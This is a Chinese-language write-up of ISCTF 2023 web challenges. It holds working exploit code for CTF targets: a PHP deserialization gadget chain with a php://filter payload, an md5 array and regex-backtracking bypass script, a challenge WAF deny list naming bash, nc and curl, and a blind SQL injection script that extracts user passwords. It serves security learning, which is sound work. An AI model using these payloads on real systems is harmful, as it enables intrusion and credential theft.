## ISCTF2023复现

[TOC]

### where is flag

一句话木马直接进去，

第一部分直接拿：ISCTF{Y0u_6u

第二部分根目录：cceeded_in_f

第三部分.sh执行文件中：ind1n9_f1ag}

或者直接在env找

---

### 圣杯之战

并不是太难的反序列化题目

```php
$a = new summon();
$a->Saber = new artifact();
$a->Saber->excalibuer = new prepare();
$a->Saber->excalibuer->release = new saber();
$a->Saber->excalibuer->release->weapon = 'php://filter/read=convert.base64-encode/resource=flag.php';

echo serialize($a);
```

```
O:6:"summon":2:{s:5:"Saber";O:8:"artifact":2:{s:10:"excalibuer";O:7:"prepare":1:{s:7:"release";O:5:"saber":1:{s:6:"weapon";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}s:5:"arrow";N;}s:5:"Rider";N;}
```

get传参然后解码即可获得flag

---

### 绕进你心里去

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';
$str = (String)$_POST['pan_gu'];
$num = $_GET['zhurong'];
$lida1 = $_GET['hongmeng'];
$lida2 = $_GET['shennong'];
if($lida1 !== $lida2 && md5($lida1) === md5($lida2)){
    echo "md5绕过了!";
    if(preg_match("/[0-9]/", $num)){
        die('你干嘛?哎哟!');
    }
    elseif(intval($num)){
        if(preg_match('/.+?ISCTF/is', $str)){
            die("再想想!");
        }
        if(stripos($str, '2023ISCTF') === false){
            die("就差一点点啦!");
        }
        echo $flag;
    }
}
?>
```

三个数组梭哈，一个用脚本正则回溯绕过漏洞

```python
import requests

url = "http://gz.imxbt.cn:20705/?hongmeng[]=1&shennong[]=2&zhurong[]=1"

param = "bx"*250000+"2023ISCTF"


data = {
    'pan_gu': param,
}
#给我出来
reponse = requests.post(url=url,data=data)
print(reponse.text)
```

---

### easy_website

```java
function DealResponse(string){
		p = document.getElementById('response')
		p.innerHTML = string;
	}

	function login(username,password){
	var xmlhttp;
	if(window.XMLHttpRequest){
		xmlhttp = new XMLHttpRequest();
	}
	else{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = function(){
		if(xmlhttp.readyState === 4 && xmlhttp.status === 200){
		var responseText = xmlhttp.responseText;
		DealResponse(responseText);
		}
	};
	xmlhttp.open("POST","/check.php");
	xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;charset=utf-8");
	var msg ="username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
	xmlhttp.send(msg);
}
```

----

### wafr

```php
<?php
/*
Read /flaggggggg.txt
*/
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

if(preg_match("/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i", $_POST['code'])){//strings
    die("想读我文件？大胆。");
}
elseif (preg_match("/\^|\||\~|\\$|\%|jay/i", $_POST['code'])){
    die("无字母数字RCE？大胆！");
}
elseif (preg_match("/bash|nc|curl|sess|\{|:|;/i", $_POST['code'])){
    die("奇技淫巧？大胆！！");
}
elseif (preg_match("/fl|ag|\.|x/i", $_POST['code'])){
    die("大胆！！！");
}
else{
    assert($_POST['code']);
}
```





---

### 1z_sqll

扫描到了`robots.txt`,进去目标页面

`sm4.js`中的内容;

```javascript
const SM4 = require("gm-crypt").sm4;

var payload = "xxx";

let sm4Config = {
    key: "B6*40.2_C9#e4$E3",
    mode: "ecb",
    cipherType: "base64"
};
let sm4 = new  SM4(sm4Config);

var result = sm4.decrypt(payload);

console.log("解密:" + result)
```

将密文解密：

```
/union|=|+|sleep|benchmark|for|where|sys|innodb|is|null|like|/*|*//i
```



```python
import requests

url = "http://gz.imxbt.cn:20692/"
words = "用户名或密码错误!"
flag=""
for i in range(1,100):
    low=32
    high=130
    mid=(high+low)//2
    while(low<high):
        #data={"username":"admin1","password":f"1' or if(ascii(substr((select group_concat(username) from bthcls.users),{i},1))>{mid},1,0)#"}
        data={"username":"admin1","password":f"1' or if(ascii(substr((select group_concat(password) from bthcls.users),{i},1))>{mid},1,0)#"}
        # print(data)
        re = requests.post(url=url,data=data).text
        # print(re)
        if words in re:
            high=mid
        else:
            low=mid+1
        mid=(low+high)//2
    if(mid==32 or high==130):
        break
    flag+=chr(mid)
    print(flag)

```

密码为：

```
we1come7o1sctf
```



----

### webinclude

```java
 function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }


const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(parameter))));
if(hash === 'dxdydxdudxdtdxeadxekdxea'){
            window.location = 'flag.html';
          }else {
            document.getElementById('fail').style.display = '';
          }

```

